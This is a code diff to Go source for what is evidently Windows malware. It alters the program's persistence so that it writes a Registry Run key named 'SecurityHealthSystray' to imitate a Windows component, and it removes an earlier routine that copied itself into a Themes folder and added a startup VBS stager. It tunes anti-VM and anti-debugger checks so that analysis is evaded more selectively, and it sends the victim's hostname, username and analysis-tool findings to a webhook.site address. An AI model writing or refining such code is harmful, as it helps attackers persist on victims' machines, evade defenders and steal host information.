@@ -1424,39 +1424,20 @@ func getFolderTree() string {
 
 func addPersistence() string {
 	exePath, _ := os.Executable()
-	installPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\update.exe`)
-	installDir := filepath.Dir(installPath)
-	os.MkdirAll(installDir, 0755)
 
-	// Copy self to install path
-	src, err := os.ReadFile(exePath)
-	if err != nil {
-		return fmt.Sprintf("Read self error: %v", err)
-	}
-	if err := os.WriteFile(installPath, src, 0755); err != nil {
-		return fmt.Sprintf("Write error: %v", err)
-	}
-
-	// Registry Run key
-	if err := regWrite(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "WindowsUpdate", installPath); err != nil {
+	// Use HKCU Run key pointing to the current executable location.
+	// No file copy, no VBS stager — just a direct registry entry which is
+	// far less likely to be flagged than Startup folder scripts.
+	if err := regWrite(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "SecurityHealthSystray", exePath); err != nil {
 		return fmt.Sprintf("Registry error: %v", err)
 	}
 
-	// VBS stager in Startup folder
-	startupPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup\service.vbs`)
-	vbs := fmt.Sprintf(`Set WshShell = WScript.CreateObject("WScript.Shell")`+"\n"+`WshShell.Run """%s""", 0, True`, installPath)
-	os.WriteFile(startupPath, []byte(vbs), 0644)
-
-	return "Persistence added (Registry + Startup VBS)"
+	return fmt.Sprintf("Persistence added (HKCU Run → %s)", exePath)
 }
 
 func removePersistence() string {
-	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "WindowsUpdate")
-	installPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\update.exe`)
-	os.Remove(installPath)
-	startupPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup\service.vbs`)
-	os.Remove(startupPath)
-	return "Persistence removed"
+	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "SecurityHealthSystray")
+	return "Persistence removed (HKCU Run key deleted)"
 }
 
 // ================================================================
@@ -1513,7 +1494,13 @@ func blockInput(block bool) string {
 
 func detectVM() bool {
 	_, triggers := detectVMDetails()
-	return len(triggers) > 0
+	// Only count non-VMware triggers (VMware products on host cause false positives)
+	for _, t := range triggers {
+		if !strings.Contains(t, "VMware") {
+			return true
+		}
+	}
+	return false
 }
 
 func detectVMDetails() (bool, []string) {
@@ -1545,6 +1532,22 @@ func detectVMDetails() (bool, []string) {
 		}
 	}
 	return len(triggers) > 0, triggers
+}
+
+// isOnlyVMware returns true when all VM triggers are VMware-related.
+// Bare-metal hosts with VMware Workstation/Player installed register VMware
+// BIOS strings and MAC OUIs, so VMware-only triggers are treated as a
+// false positive and execution continues.
+func isOnlyVMware(triggers []string) bool {
+	if len(triggers) == 0 {
+		return false
+	}
+	for _, t := range triggers {
+		if !strings.Contains(t, "VMware") {
+			return false
+		}
+	}
+	return true
 }
 
 func detectDebugger() bool {
@@ -2087,15 +2090,21 @@ func jitteredSleep(base time.Duration, jitterPct int) {
 // ================================================================
 
 func main() {
-	// Anti-analysis: exit if VM or debugger
+	// Anti-analysis: exit if non-VMware VM or debugger detected.
+	// VMware-only triggers are treated as false positives (host has VMware installed).
 	vmDetected, vmTriggers := detectVMDetails()
 	dbgDetected, dbgTriggers := detectDebuggerDetails()
+	vmwareOnly := isOnlyVMware(vmTriggers)
+	shouldExit := (vmDetected && !vmwareOnly) || dbgDetected
+
 	if vmDetected || dbgDetected {
 		hostname, _ := os.Hostname()
 		cu, _ := user.Current()
 		report := map[string]interface{}{
-			"hostname": hostname,
-			"username": cu.Username,
+			"hostname":     hostname,
+			"username":     cu.Username,
+			"vmware_only":  vmwareOnly,
+			"will_exit":    shouldExit,
 		}
 		if vmDetected {
 			report["vm_triggers"] = vmTriggers
@@ -2105,9 +2114,13 @@ func main() {
 		}
 		report["analysis_tools"] = detectAnalysisTools()
 		payload, _ := json.Marshal(report)
-		http.Post("https://webhook.site/a1538d54-d27c-4d76-98ba-83ca37c2703d", "application/json", bytes.NewReader(payload))
-		time.Sleep(time.Duration(mrand.Intn(10)+5) * time.Second)
-		os.Exit(0)
+		http.Post("https://webhook.site/0a0aea37-6d21-47b2-844f-30db3cee67e3", "application/json", bytes.NewReader(payload))
+
+		if shouldExit {
+			time.Sleep(time.Duration(mrand.Intn(10)+5) * time.Second)
+			os.Exit(0)
+		}
+		// VMware-only: log sent, continue execution
 	}
 
 	// Single instance
